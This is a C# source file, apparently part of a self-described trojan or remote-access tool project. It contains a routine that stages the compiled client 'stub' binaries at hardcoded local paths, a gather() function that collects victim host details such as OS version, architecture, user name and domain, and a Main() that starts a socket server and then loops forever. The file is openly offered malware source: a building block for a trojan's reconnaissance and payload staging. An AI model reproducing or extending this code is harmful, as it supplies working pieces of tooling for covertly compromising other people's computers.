using System;
using System.Text;
using System.Diagnostics;
using System.Runtime.InteropServices;
using Trojan.server;
using SocketData;

namespace Trojan
{
    public class TrojanBaseClass
    {
        static internal void MoveTrojanStub()
        {
            //string[] BuildFiles = Directory.GetFiles(TrojanStubLocation);

            string[] accepted_files = new string[4]
            {
                "client.dll",
                "client.exe",
                "client.runtimeconfig.json",
                "Trojan.dll"
            };

            string TrojanStubLocation = @"C:\Users\lasse\source\repos\Trojan\client\bin\Debug\net6.0";
            string new_TrojanStubLocation = @"C:\Users\lasse\source\repos\Trojan\stub";

            if (Directory.Exists(new_TrojanStubLocation) && Directory.GetFiles(TrojanStubLocation).Length > 0)
            {
                string[] OldBuildFiles = Directory.GetFiles(new_TrojanStubLocation);
                foreach (string FileToDelete in OldBuildFiles)
                {
                    File.Delete(FileToDelete);
                }
            }
            else { Directory.CreateDirectory(new_TrojanStubLocation); }

            string[] BuildFiles = Directory.GetFiles(TrojanStubLocation);

            string[] NewPathSplit;
            string NewPath;
            foreach (string NewFilePath in BuildFiles)
            {
                NewPathSplit = NewFilePath.Split("\\");
                NewPath = NewPathSplit[NewPathSplit.Length - 1];
                for(int i = 0; i < accepted_files.Length; i++)
                {
                    if (NewPath == accepted_files[i])
                    {
                        File.Move(NewFilePath, new_TrojanStubLocation + "\\" + NewPath);
                    }
                }
            }
        }

        public static string gather()
        {
            StringBuilder CommandOutput = new StringBuilder();

            if(SocketHandler.BUILDFOR == "windows10")
            {
                CommandOutput.AppendLine("\t[+] " + Environment.OSVersion.ToString());
                CommandOutput.AppendLine("\t[+] " + Environment.GetEnvironmentVariable("PROCESSOR_ARCHITECTURE"));
                CommandOutput.AppendLine("\t[+] " + RuntimeInformation.OSArchitecture.ToString());
                CommandOutput.AppendLine("\t[+] " + Environment.SystemDirectory);
                CommandOutput.AppendLine("\t[+] " + Environment.UserName);
                CommandOutput.AppendLine("\t[+] " + Environment.UserDomainName);
                CommandOutput.Append("\t[+] " + Environment.Version.ToString());
            }

            return(CommandOutput.ToString());
        }

        public Server server = new Server();

        /// <summary>
        /// The main entry point for the application.
        /// </summary>
        public static void Main()
        {
            TrojanBaseClass TrojanBase = new TrojanBaseClass();

            TrojanBase.server.Init_Server(SocketHandler.PORT, SocketHandler.BUFFSIZE);

            MoveTrojanStub();
            while(true)
            {
 
            }
        }
    }
}
